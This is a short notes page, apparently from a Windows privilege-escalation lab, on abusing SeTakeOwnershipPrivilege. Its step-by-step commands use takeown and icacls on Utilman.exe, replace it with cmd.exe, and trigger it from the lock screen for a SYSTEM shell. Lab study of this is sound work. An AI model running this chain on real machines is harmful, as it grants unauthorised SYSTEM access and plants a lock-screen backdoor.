---
sidebar_position: 2
title: SeTakeOwnership
---


**`SeTakeOwnership`** Privilege allows a user to take Ownership of any **Object** on the System, **Including Files and Registry Keys.**


---

<br/>


- <b style={{ color: 'Red' }}>[NOTE]</b> The <span style={{fontWeight: 'Bold'}}>Command Prompt</span> needs to be open as <b style={{ color: 'Red' }}>Administrator</b>

```log
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
// highlight-next-line
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
```

<br/> 

- Abusing <b style={{ color: 'MediumTurquoise' }}>Utilman.exe</b> to Escalate Privileges **(Utilman is a Built-In Windows Application used to provide Ease of Access options during the Lock Screen).**
- **`Utilman`** is run with `SYSTEM` Privileges, we will effectively gain **SYSTEM** Privileges if we `[Replace the Original Binary]` for any PAYLOAD.
- Taking Ownership of <b style={{ color: 'MediumTurquoise' }}>Utilman.exe</b>

```log
C:\> takeown /f C:\Windows\System32\Utilman.exe
SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

<br/>

- Giving User Full Permissions <b style={{ color: 'DeepSkyBlue' }}>THMTakeOwnership:(F)</b> over <b style={{ color: 'MediumTurquoise' }}>Utilman.exe</b>

```log
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```


<br/>

- Replacing <b style={{ color: 'MediumTurquoise' }}>Utilman.exe</b> with a copy of `cmd.exe`

```log
C:\Windows\System32\> copy cmd.exe utilman.exe
```

- To trigger `Utilman` we click **Ease of Access**  Button from the **Lock Screen.**